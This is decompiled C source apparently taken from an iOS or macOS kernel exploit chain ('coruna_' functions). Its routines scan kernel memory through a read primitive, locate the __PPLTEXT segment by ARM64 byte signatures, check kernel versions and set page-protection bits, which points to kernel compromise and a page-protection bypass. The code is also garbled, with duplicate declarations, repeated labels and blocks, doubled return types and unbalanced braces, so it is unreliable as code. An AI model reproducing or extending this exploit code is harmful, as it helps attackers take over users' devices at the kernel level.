        tag = scratch;
        if ((int)type_id != 0) {
          return type_id;
        }
        type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae00018,&scratch,0)
        ;
        kind = scratch;
        if ((int)type_id != 0) {
          return type_id;
        }
        type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae0001c,&scratch,0)
        ;
        if ((int)type_id != 0) {
          return type_id;
        }
        handle = coruna_u64_pack((scratch), (kind)) - coruna_u64_pack((tag), (port));
      }
      arg = (coruna_u64_pack((size), (version)) + handle) - 0x400000U &
                (*(unsigned long *)k_kernel_vm_kernel_page_mask_slot ^ 0xffffffffffffffff);
      type_id = *(uint64_t *)k_kernel_vm_kernel_page_size_slot;
      type_id = coruna_kernel600c_residual_218(handle,arg,arg - 0x1000000,arg + 0x800000,type_id);
      if ((int)type_id == 0) {
      return 0;
      }
      return type_id;
    }
  }
  if (arg == 0) {
    err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x18),0x40);
    if (err == 0) {
      return 0xad022;
    }
    arg = *(unsigned long *)(handle + 0x38);
  }
  arg = arg & (*(unsigned long *)k_kernel_vm_kernel_page_mask_slot ^ 0xffffffffffffffff);
  err = coruna_ctx_test_flag(handle,0x20);
  if (err == 0) {
    if (*(int *)(handle + 0x140) < 0x2258) {
      err = coruna_ctx_test_flag(handle,0x400000);
      handle = 0x2000000;
      if (err != 0) {
        handle = 0x20000000;
      }
      type_id_8 = handle + arg;
    }
    else {
      type_id_8 = (*(long *)(handle + 0x80) + arg) - *(long *)(handle + 0x38);
    }
    handle = *(long *)k_kernel_vm_kernel_page_size_slot;
    thread_attr = 0;
    bootargs = '\0';
    while( true ) {
      if (type_id_8 <= arg) {
        return 0xad011;
      }
      type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),arg,&thread_attr,0);
      if ((int)type_id != 0) break;
      if ((thread_attr == -0x1120531) &&
         (coruna_kernel600c_residual_220(handle,arg,type_id_8,&bootargs), bootargs != '\0')) {
        *(unsigned long *)(handle + 0x38) = arg;
        return 0;
      }
      arg = arg + handle;
    }
    return type_id;
  }
  type_id = *(uint64_t *)k_kernel_vm_kernel_page_size_slot;
fail:
  type_id = coruna_kernel600c_residual_218(handle,arg,arg - 0x1000000,arg + 0x800000,type_id);
  if ((int)type_id == 0) {
    return 0;
  }
  return type_id;
}





uint64_t coruna_kernel600c_residual_218(long handle,unsigned long arg,unsigned long arg,uint64_t val,long addr_2)
{
  uint64_t u;
  char scratch;
  int bootargs;
  
  bootargs = 0;
  scratch = '\0';
  while( true ) {
    if (arg < arg) {
      return 0xad011;
    }
    u = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),arg,&bootargs,0);
    if ((int)u != 0) break;
    if ((bootargs == -0x1120531) &&
       (coruna_kernel600c_residual_220(handle,arg,val,&scratch), scratch != '\0')) {
      *(unsigned long *)(handle + 0x38) = arg;
      return 0;
    }
    arg = arg - addr_2;
  }
  return u;
}





uint64_t
void coruna_kernel600c_residual_219(long handle,unsigned long arg,unsigned long arg,long *addr_2,long *off_3,long ctx_4)
{
  long handle;
  long addr;
  bool err;
  uint64_t u;
  unsigned long size;
  unsigned long version;
  uint port;
  int err;
  uint tag;
  unsigned long kind;
  uint type_id;
  unsigned long type_id_8;
  
  u = 0xad011;
  *addr_2 = 0;
  *off_3 = 0;
  if (3 < arg) {
    port = 0;
    tag = 0;
    version = 0;
    err = false;
    err = 8;
    do {
      if (err) {
        kind = version >> 1;
        if (*(int *)(ctx_4 + 0x140) < 0x225c) {
          type_id_8 = *(unsigned long *)(handle + kind * 8);
          kind = version + 2 >> 1;
          size = version + 4 >> 1;
        }
        else {
          type_id_8 = (unsigned long)*(ushort *)(handle + kind * 8 + 0x18);
          size = kind + 2;
        }
        if (type_id_8 == 0x18) {
          version = *(unsigned long *)(handle + size * 8);
          handle = 0;
          if (version <= arg) {
            handle = arg - version;
          }
          addr = *(long *)(handle + kind * 8) - handle;
          if (addr == 0) {
            return u;
          }
          *addr_2 = addr;
          *off_3 = handle + version;
          return 0;
        }
        type_id = tag + 1;
        if (port <= type_id) {
          if (err == 6) {
            return u;
          }
          type_id = 0;
          version = version - (long)(int)(err * tag + -1);
          err = 6;
        }
        version = version + (err - 1);
        err = true;
        tag = type_id;
      }
      else if (*(int *)(handle + version * 4) == 0x686f6d6d) {
        port = *(uint *)(handle + version * 4 + 0xc);
        version = version + 5;
        err = true;
      }
      else {
        err = false;
      }
      version = version + 1;
    } while (version < arg >> 2);
  }
  return u;
}
uint64_t
void coruna_kernel600c_str_bootargs(void (*arg,void (*val,uint64_t val,uint64_t *id_2,uint64_t size_3,
            uint64_t off_4)
{
  int err;
  unsigned long *ptr;
  bool err;
  bool status;
  uint u;
  int status;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  long handle;
  unsigned long tag;
  long addr;
  unsigned long kind;
  unsigned long type_id;
  unsigned long type_id_8;
  uint type_id_9;
  void *ptr;
  long off;
  byte flags;
  uint type_id_10;
  long scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info;
  uint64_t serial_buf;
  long action;
  unsigned long block_ctx;
  int stack_guard;
  int sa_saved;
  long sa_new;
  long path_buf;
  long tmp_buf;
  unsigned long region;
  unsigned long plist;
  int url_buf;
  uint json_buf;
  uint8_t frame[12];
  int work;
  uint cache;
  uint cache_20;
  unsigned long cache_21 [2];
  uint32_t cache_22[2];
  uint32_t cache_23;
  uint8_t scratch;
  uint16_t bootargs;
  uint8_t thread_attr;
  uint64_t host_info;
  unsigned long cache_24;
  long cache_25;
  long cache_26;
  
  cache_26 = *(long *)k_kernel_stack_chk_guard_slot;
  stack_guard = 0;
  action = 0;
  block_ctx = 0;
  cache_21[0] = 0;
  cache_21[1] = 0;
  serial_buf = 0;
  id_2[1] = 0;
  *id_2 = 0;
  id_2[3] = 0;
  id_2[2] = 0;
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[9] = 0;
  id_2[8] = 0;
  id_2[0xb] = 0;
  id_2[10] = 0;
  id_2[0xd] = 0;
  id_2[0xc] = 0;
  id_2[0xf] = 0;
  id_2[0xe] = 0;
  id_2[0x11] = 0;
  id_2[0x10] = 0;
  id_2[0x13] = 0;
  id_2[0x12] = 0;
  id_2[0x15] = 0;
  id_2[0x14] = 0;
  id_2[0x17] = 0;
  id_2[0x16] = 0;
  id_2[0x19] = 0;
  id_2[0x18] = 0;
  id_2[0x1b] = 0;
  id_2[0x1a] = 0;
  *id_2 = arg;
  id_2[1] = val;
  id_2[2] = val;
  id_2[3] = size_3;
  size = k_kernel_rodata_word_377e0;
  id_2[6] = k_kernel_rodata_word_000377e8;
  id_2[5] = size;
  id_2[4] = off_4;
  size = coruna_kernel600c_via_cpu_capabilities_base();
  id_2[0xe] = size;
  version = coruna_return_zero_ddbc(id_2,0,0);
  if ((int)version == 0) {
    u = coruna_cpu_core_count();
    status = coruna_ctx_test_flag(id_2[3],0x5184001);
    version = (*val)(val,*(uint64_t *)(id_2[4] + (unsigned long)(status != 0) * 8),&stack_guard,0);
    ptr = (void *)0x0;
    port = version;
    }
    done:
    id_2[0x19] = 0;
    id_2[0x18] = 0;
    id_2[0x1b] = 0;
    id_2[0x1a] = 0;
    id_2[0x15] = 0;
    id_2[0x14] = 0;
    id_2[0x17] = 0;
    id_2[0x16] = 0;
    id_2[0x11] = 0;
    id_2[0x10] = 0;
    id_2[0x13] = 0;
    id_2[0x12] = 0;
    id_2[0xd] = 0;
    id_2[0xc] = 0;
    id_2[0xf] = 0;
    id_2[0xe] = 0;
    id_2[9] = 0;
    id_2[8] = 0;
    id_2[0xb] = 0;
    id_2[10] = 0;
    id_2[5] = 0;
    id_2[4] = 0;
    id_2[7] = 0;
    id_2[6] = 0;
    id_2[1] = 0;
    *id_2 = 0;
    id_2[3] = 0;
    id_2[2] = 0;
    exit_ok:
    stack_guard = 0;
    action = 0;
    block_ctx = 0;
    if (ptr != (void *)0x0) {
    _bzero(ptr,0x4000);
    _free(ptr);
    }
    if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
    return port;
  }
  else {
fail:
    ptr = (void *)0x0;
    port = version;
  }
done:
  id_2[0x19] = 0;
  id_2[0x18] = 0;
  id_2[0x1b] = 0;
  id_2[0x1a] = 0;
  id_2[0x15] = 0;
  id_2[0x14] = 0;
  id_2[0x17] = 0;
  id_2[0x16] = 0;
  id_2[0x11] = 0;
  id_2[0x10] = 0;
  id_2[0x13] = 0;
  id_2[0x12] = 0;
  id_2[0xd] = 0;
  id_2[0xc] = 0;
  id_2[0xf] = 0;
  id_2[0xe] = 0;
  id_2[9] = 0;
  id_2[8] = 0;
  id_2[0xb] = 0;
  id_2[10] = 0;
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[1] = 0;
  *id_2 = 0;
  id_2[3] = 0;
  id_2[2] = 0;
exit_ok:
  stack_guard = 0;
  action = 0;
  block_ctx = 0;
  if (ptr != (void *)0x0) {
    _bzero(ptr,0x4000);
    _free(ptr);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
    return port;
  }
  ___stack_chk_fail();
}





uint64_t coruna_vm_deallocate_af48(long handle)
{
  vm_address_t address;
  
  address = *(vm_address_t *)(handle + 0xd0);
  if ((address != 0) && (*(vm_size_t *)(handle + 0xd8) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0xd8)
                  );
    *(vm_address_t *)(handle + 0xd0) = 0;
    *(uint64_t *)(handle + 0xd8) = 0;
  }
  return 0;
}





uint64_t coruna_vm_deallocate_93b0(uint64_t *val)
{
  if ((val[0x1a] != 0) && (val[0x1b] != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,val[0x1a],val[0x1b]);
  }
  val[0x19] = 0;
  val[0x18] = 0;
  val[0x1b] = 0;
  val[0x1a] = 0;
  val[0x15] = 0;
  val[0x14] = 0;
  val[0x17] = 0;
  val[0x16] = 0;
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  return 0;
}





void coruna_kernel600c_residual_220(uint64_t *val,long handle,unsigned long arg,char *path)
{
  unsigned long u;
  bool err;
  int err;
  unsigned long size;
  uint version;
  uint8_t scratch[256];
  unsigned long bootargs;
  int thread_attr;
  uint host_info;
  uint8_t serial_buf[12];
  int action;
  uint block_ctx;
  uint stack_guard;
  
  *path = '\0';
  size = handle + 0x20;
  if ((((arg == 0) || (size <= arg)) &&
      (err = (*(void (*)*val)(val[2],handle,0x20,serial_buf), err == 0)) &&
     (((block_ctx - 9 < 0x37 && action == 2 &&
       ((unsigned long)stack_guard <= (unsigned long)(*(long *)k_kernel_vm_kernel_page_size_slot * 2))) &&
      (*path == '\0')))) {
    u = size + stack_guard;
    version = 1;
    while( true ) {
      if (u < size + 8) {
        return;
      }
      if ((arg != 0) && (arg < size + 8)) {
        return;
      }
      err = (*(void (*)*val)(val[2],size,8,&thread_attr);
      if (err != 0) {
        return;
      }
      if (host_info < 8) {
        return;
      }
      if (u < size + host_info) {
        return;
      }
      if (thread_attr == 5) break;
      if (*path != '\0') {
        return;
      }
      err = block_ctx <= version;
      size = size + host_info;
      version = version + 1;
      if (err) {
        return;
      }
    }
    if ((((arg == 0) || (size + 0x120 <= arg)) &&
        (err = (*(void (*)*val)(val[2],size + 0x10,0x110,scratch), err == 0)) &&
       (((unsigned long)val[5] < bootargs && (bootargs <= (unsigned long)val[6])))) {
      *path = '\x01';
    }
  }
  return;
}
uint64_t coruna_kernel600c_residual_221(uint64_t *val,unsigned long arg,unsigned long arg)
{
  int err;
  uint u;
  uint64_t size;
  unsigned long version;
  uint port;
  unsigned long tag;
  long handle;
  long addr;
  uint64_t *ptr;
  unsigned long kind;
  unsigned long type_id;
  uint8_t scratch[32];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = k_kernel_rodata_word_00037448;
  bootargs = k_kernel_rodata_word_37440;
  thread_attr = k_kernel_rodata_word_00037438;
  bootargs = k_kernel_rodata_word_37430;
  addr = val[3];
  err = *(int *)(addr + 0x140);
  size = 0x2802c;
  if (err < 0x2258) {
    if (err == 0x1c1b) {
      port = 0x118;
    }
    else if (err == 0x1f53) {
      port = 0x128;
    }
    else {
      if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
      return size;
      }
      ___stack_chk_fail();
    }
  }
  else if (err == 0x2258 || err == 0x225c) {
    port = 0xc0;
  }
  else {
    if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
    }
    ___stack_chk_fail();
  }
  kind = *(unsigned long *)(addr + 0x158);
  if (kind >> 0x2b < 1099) {
    type_id = 0;
    ptr = &bootargs;
  }
  else {
    ptr = &bootargs;
    u = 0;
    if (port != 0) {
      u = *(uint *)(addr + 0x180) / port;
    }
    type_id = (unsigned long)(*(uint *)(addr + 0x180) - u * port);
  }
  size = 0xad022;
  if (arg <= arg) {
    do {
      handle = 4;
      tag = arg;
      do {
        size = (*(void (*)*val)(val[2],type_id + tag,0x20,scratch);
        if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
        return size;
        }
        ___stack_chk_fail();
      } while (handle != 0);
      arg = arg - *(long *)k_kernel_vm_page_size_slot;
      size = 0xad022;
    } while (arg <= arg);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return size;
  }
  ___stack_chk_fail();
}





bool coruna_kernel600c_via_ptr_canonicalize(uint64_t val,long *handle,long *addr_2)
{
  bool err;
  long handle;
  
  if (*addr_2 == *handle && addr_2[1] == handle[1]) {
    handle = coruna_ptr_canonicalize(val,addr_2[2]);
    err = false;
    if (handle != 0) {
      handle = coruna_ptr_canonicalize(val,addr_2[3]);
      err = handle != 0;
    }
  }
  else {
    err = false;
  }
  return err;
}





uint64_t
void coruna_memmem_f470(uint64_t *val,long handle,unsigned long arg,void *ctx,unsigned long arg,
            long *addr_2)
{
  size_t ls1;
  bool err;
  void *ptr;
  void *buf;
  unsigned long u;
  unsigned long size;
  uint64_t version;
  
  version = 0xad001;
  u = *(unsigned long *)k_kernel_vm_page_size_slot;
  *addr_2 = 0;
  if (arg <= u) {
    ptr = _malloc(u);
    if (ptr == (void *)0x0) {
      version = 0xad00c;
    }
    else {
      if (arg == 0) {
        version = 0;
      }
      else {
        size = (u - arg) + 1 & 0xfffffffffffffff0;
        do {
          ls1 = u;
          if (arg <= u) {
            ls1 = arg;
          }
          version = (*(void (*)*val)(val[2],handle,ls1,ptr);
          if ((int)version != 0) break;
          buf = _memmem(ptr,ls1,ctx,arg);
          version = 0;
          if (buf != (void *)0x0) {
            *addr_2 = (handle - (long)ptr) + (long)buf;
            break;
          }
          if (arg <= u) break;
          handle = size + handle;
          err = size != arg;
          arg = arg - size;
        } while (err);
      }
      _bzero(ptr,u);
      _free(ptr);
    }
  }
  return version;
}





uint32_t coruna_cfdictionaryapplyfunction(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  scratch[0] = 0xad001;
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_fn_ptr_cast(coruna_cfdictionarygetvalueifpresent);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return scratch[0];
}





void coruna_cfdictionarygetvalueifpresent(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  long off;
  uint64_t u;
  uint64_t size;
  long scratch;
  int bootargs [2];
  long thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    err = 0xad001;
  }
  else {
    handle = _CFGetTypeID(addr_2);
    addr = _CFStringGetTypeID();
    if ((((addr == handle) || (addr = _CFArrayGetTypeID(), addr == handle)) ||
        (addr = _CFBooleanGetTypeID(), addr == handle)) ||
       (addr = _CFNumberGetTypeID(), addr == handle)) {
      scratch = 0;
      err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&scratch);
      if (err == 0) {
fail:
        if (*flags != 0) {
          return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
      handle = _CFGetTypeID(scratch);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        off = _CFArrayGetTypeID();
        addr = scratch;
        if (off == handle) {
          err = 0xad001;
          if (scratch != 0) {
            handle = _CFGetTypeID(scratch);
            off = _CFArrayGetTypeID();
            if (handle == off) {
              handle = _CFGetTypeID(addr_2);
              off = _CFArrayGetTypeID();
              if (handle == off) {
                handle = _CFGetTypeID(addr_2);
                off = _CFArrayGetTypeID();
                err = 0xad001;
                if (handle == off) {
                  bootargs[0] = coruna_cat(bootargs[0],1);
                  u = _CFArrayGetCount(addr_2);
                  size = coruna_fn_ptr_cast(coruna_cfstringgettypeid);
                  _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                  if ((char)bootargs[0] == '\0') {
                    err = 0xad014;
                  }
                  else {
                    bootargs[0] = 0;
                    thread_attr = addr;
                    u = _CFArrayGetCount(addr_2);
                    size = coruna_fn_ptr_cast(coruna_cfarraycontainsvalue);
                    _CFArrayApplyFunction(addr_2,0,u,size,bootargs);
                    err = bootargs[0];
                  }
                }
              }
            }
          }
          *flags = err;
          return;
        }
        if (*flags != 0) {
        return;
        }
        _CFDictionarySetValue(*(uint64_t *)(flags + 2),handle,addr_2);
        return;
      }
    }
    err = 0xad014;
  }
  *flags = err;
  return;
}





uint32_t coruna_cfdictionaryapplyfunction_f82c(long handle,long addr_2)
{
  long handle;
  long addr;
  uint64_t u;
  uint32_t scratch[2];
  long bootargs;
  
  scratch[0] = 0xad001;
  if (handle != 0) {
    handle = _CFGetTypeID();
    addr = _CFDictionaryGetTypeID();
    if ((handle == addr) && (addr_2 != 0)) {
      handle = _CFGetTypeID(addr_2);
      addr = _CFDictionaryGetTypeID();
      if (handle == addr) {
        scratch[0] = 0;
        bootargs = handle;
        u = coruna_fn_ptr_cast(coruna_cfdictionarygetvalueifpresent_f8c4);
        _CFDictionaryApplyFunction(addr_2,u,scratch);
      }
    }
  }
  return scratch[0];
}





void coruna_cfdictionarygetvalueifpresent_f8c4(long handle,long addr_2,int *flags)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  int scratch [2];
  uint64_t bootargs;
  uint64_t thread_attr;
  
  if (flags == (int *)0x0) {
    return;
  }
  if (*flags != 0) {
    return;
  }
  if ((handle == 0) || (addr_2 == 0)) {
    scratch[0] = 0xad001;
  }
  else {
    thread_attr = 0;
    err = _CFDictionaryGetValueIfPresent(*(uint64_t *)(flags + 2),handle,&thread_attr);
    if (err == 0) {
      scratch[0] = 0xad011;
    }
    else {
      handle = _CFGetTypeID(thread_attr);
      addr = _CFGetTypeID(addr_2);
      if (addr == handle) {
        addr = _CFArrayGetTypeID();
        if (addr == handle) {
          scratch[0] = 0;
          bootargs = thread_attr;
          u = _CFArrayGetCount(addr_2);
          size = coruna_fn_ptr_cast(coruna_cfarraycontainsvalue_fa90);
          _CFArrayApplyFunction(addr_2,0,u,size,scratch);
          *flags = scratch[0];
          return;
        }
        err = _CFEqual(addr_2,thread_attr);
        if (err != 0) {
          *flags = 0;
          return;
        }
      }
      scratch[0] = 0xad014;
    }
  }
fail:
  *flags = scratch[0];
  return;
}





void coruna_cfarraycontainsvalue(long handle,int *flags)
{
  int err;
  uint64_t u;
  uint64_t size;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    if (handle == 0) {
      *flags = 0xad001;
    }
    else {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err == 0) {
        _CFArrayAppendValue(*(uint64_t *)(flags + 2),handle);
        return;
      }
    }
  }
  return;
}





void coruna_cfstringgettypeid(long handle,uint8_t *buf)
{
  long handle;
  long addr;
  
  if (buf != (uint8_t *)0x0) {
    if (handle != 0) {
      handle = _CFGetTypeID();
      addr = _CFStringGetTypeID();
      if (handle == addr) {
        return;
      }
    }
    *buf = 0;
  }
  return;
}





void coruna_cfarraycontainsvalue_fa90(long handle,int *flags)
{
  int err;
  uint64_t u;
  uint64_t size;
  
  if ((flags != (int *)0x0) && (*flags == 0)) {
    err = 0xad001;
    if (handle != 0) {
      size = *(uint64_t *)(flags + 2);
      u = _CFArrayGetCount(size);
      err = _CFArrayContainsValue(size,0,u,handle);
      if (err != 0) {
        return;
      }
      err = 0xad011;
    }
    *flags = err;
  }
  return;
}





void coruna_kernel600c_via_ctx_test_flag_4(long handle)
{
  int err;
  
  err = coruna_ctx_test_flag(handle,0x5184000);
  if (((err == 0) ||
      ((*(unsigned long *)(handle + 0x158) < 0x2712000c700000 &&
       ((*(unsigned long *)(handle + 0x158) < 0x225c2380100000 || (0x2711 < *(int *)(handle + 0x140)))))))
     && ((err = coruna_ctx_test_flag(handle,0x5100000), err == 0 ||
         ((*(unsigned long *)(handle + 0x158) < 0x27120007400000 &&
          ((*(unsigned long *)(handle + 0x158) < 0x225c1e80500000 || (0x2711 < *(int *)(handle + 0x140))))
          ))))) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if ((err != 0) && (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158))) {
      coruna_helper_10260_193e0(handle);
      return;
    }
    coruna_kernel29d3c_via_free_1b984(handle);
    return;
  }
  return;
}





bool coruna_call_helper_2e7a0(uint64_t val)
{
  int err;
  
  err = coruna_ctx_test_flag(val,0x5184001);
  return err != 0;
}





uint64_t coruna_return_zero_fc20(long handle,unsigned long arg,long addr_2,unsigned long arg)
{
  unsigned long u;
  uint size;
  unsigned long version;
  int err;
  uint64_t port;
  unsigned long tag;
  unsigned long kind;
  long handle;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  unsigned long scratch;
  uint64_t bootargs;
  unsigned long thread_attr;
  long host_info;
  
  thread_attr = 0;
  host_info = 0;
  scratch = 0;
  bootargs = 0;
  port = coruna_ctx_test_flag(handle,0x5184001);
  if ((int)port == 0) {
    return port;
  }
  if (arg == 0) {
    return 0;
  }
  if (addr_2 == 0) {
    return 0;
  }
  if ((int)arg == 0) {
    return 0;
  }
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    port = coruna_find_ppltext(handle,&thread_attr,(long)&bootargs + 4);
    version = thread_attr;
    if ((int)port == 0) {
      return port;
    }
    if (thread_attr <= arg) {
      u = arg + (arg & 0xffffffff);
      size = bootargs;
      type_id_8 = (unsigned long)bootargs;
      if (u <= thread_attr + type_id_8) {
        port = coruna_kernel600c_via_return_zero_2b63c(handle,3,&host_info);
        if ((int)port == 0) {
          return port;
        }
        if (host_info == 0) {
          type_id = type_id_8 + 8;
          if (size < 0x8c001 && *(long *)(handle + 0x158) + 0xffe7f6f5f8700000U < 0xf78900000) {
            type_id = 0x8c008;
          }
          kind = (unsigned long)*(uint *)(handle + 0x180);
          tag = 0;
          if (kind != 0) {
            tag = type_id / kind;
          }
          handle = type_id - tag * kind;
          err = 0;
          if (handle != 0) {
            err = *(uint *)(handle + 0x180) - (int)handle;
          }
          bootargs = coruna_u64_pack((bootargs), (int)type_id + err);
          host_info = coruna_vm_deallocate_2ced4(handle,&bootargs);
          if (host_info == 0) {
            return 0;
          }
          port = coruna_kernel600c_via_return_zero_2b63c_2(handle,3,host_info);
          if ((int)port == 0) {
            return port;
          }
        }
        tag = *(unsigned long *)(handle + 0x188);
        for (type_id = arg & (tag ^ 0xffffffffffffffff);
            type_id <= (u - 1 & (tag ^ 0xffffffffffffffff));
            type_id = type_id + *(uint *)(handle + 0x180)) {
          port = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,host_info + type_id_8,8,&scratch);
          if ((int)port == 0) {
            return port;
          }
          kind = type_id - version;
          type_id_9 = (unsigned long)(1 << (unsigned long)((uint)(kind >> 0xe) & 0x1f));
          if ((scratch & type_id_9) == 0) {
            port = coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_17fcc(handle,host_info + kind,type_id);
            if ((int)port == 0) {
              return port;
            }
            scratch = scratch | type_id_9;
            port = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,host_info + type_id_8,&scratch,8);
            if ((int)port == 0) {
              return port;
            }
          }
        }
        port = coruna_call_mach_vm_machine_attribute_29df8_1e994(handle,(arg - version) + host_info,addr_2,arg);
        err = (int)port;
        goto joined_r0x0000fde4;
      }
    }
    port = 0;
  }
  else {
    port = coruna_bzero_3(handle,arg,addr_2,arg,0);
    err = (int)port;
joined_r0x0000fde4:
    if (err != 0) {
      port = 1;
    }
  }
  return port;
}





bool coruna_bzero_3(long handle,unsigned long arg,uint64_t val,unsigned long arg,uint64_t id_2)
{
  int err;
  uint u;
  unsigned long *ptr;
  unsigned long size;
  unsigned long version;
  long handle;
  long addr;
  unsigned long port;
  uint scratch;
  long bootargs;
  
  err = coruna_mach_absolute_time_1c000(handle,5,&k_kernel_slot_2710);
  return err == 0;
}





void coruna_find_ppltext(long handle,long *addr_2,int *flags)
{
  bool err;
  long handle;
  int err;
  int status;
  unsigned long u;
  long addr;
  char *ptr;
  uint64_t scratch;
  long bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  long serial_buf;
  unsigned long action;
  
  addr = *(long *)(&k_kernel_slot_1888 + handle);
  if (addr != 0) {
    err = *(int *)(&k_kernel_slot_1890 + handle);
    *addr_2 = addr;
    *flags = err;
    return;
  }
  err = *(int *)(*(long *)(&k_kernel_slot_19f8 + handle) + 0x70);
  if (err < 0x2258) {
    ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
    }
    check_ok:
    coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
    if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
    if (serial_buf == 0) {
    return;
    }
    u = (unsigned long)*(uint *)(handle + 0x180);
    err = action < u;
    action = action - u;
    if (err || action == 0) {
    return;
    }
    serial_buf = serial_buf + u;
    }
    bootargs = serial_buf;
    scratch = host_info;
    thread_attr = action;
    handle = coruna_strsep(&scratch,ptr,0,1);
    if (handle == 0) {
    return;
      }
      check_ok:
      coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
      if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
      if (serial_buf == 0) {
      return;
    }
    ptr = "1F 01 .. EB 20 91 .. FA .. .. 00 54";
  }
  else {
    if (err != 0x2258 && err != 0x225c) {
      status = 0x2712;
cleanup:
      if (err != status) {
        ptr = (char *)0x0;
        coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
        if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
        if (serial_buf == 0) {
        return;
        }
        u = (unsigned long)*(uint *)(handle + 0x180);
        err = action < u;
        action = action - u;
        if (err || action == 0) {
        return;
        }
        serial_buf = serial_buf + u;
        }
        bootargs = serial_buf;
        scratch = host_info;
        thread_attr = action;
        handle = coruna_strsep(&scratch,ptr,0,1);
        if (handle == 0) {
        return;
        }
        addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
        if (addr == 0) {
        addr = 0;
        }
        else {
        addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
        err = 0;
        }
        else {
        handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
        if (handle == 0) {
        return;
        }
        handle = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
        if (handle == 0) {
        return;
        }
        err = (int)handle - (int)addr;
        }
        if (addr == 0) {
        return;
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
        if (*(int *)(handle + 0x140) < 0x1809) {
        err = 0x90000;
        }
        else {
        err = 0x88000;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        err = 0x8c000;
        }
        }
        }
        *(long *)(&k_kernel_slot_1888 + handle) = addr;
        *(int *)(&k_kernel_slot_1890 + handle) = err;
        *addr_2 = addr;
        *flags = err;
        return;
      }
    }
done:
    ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
  }
check_ok:
  coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
  if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
    if (serial_buf == 0) {
      return;
    }
    u = (unsigned long)*(uint *)(handle + 0x180);
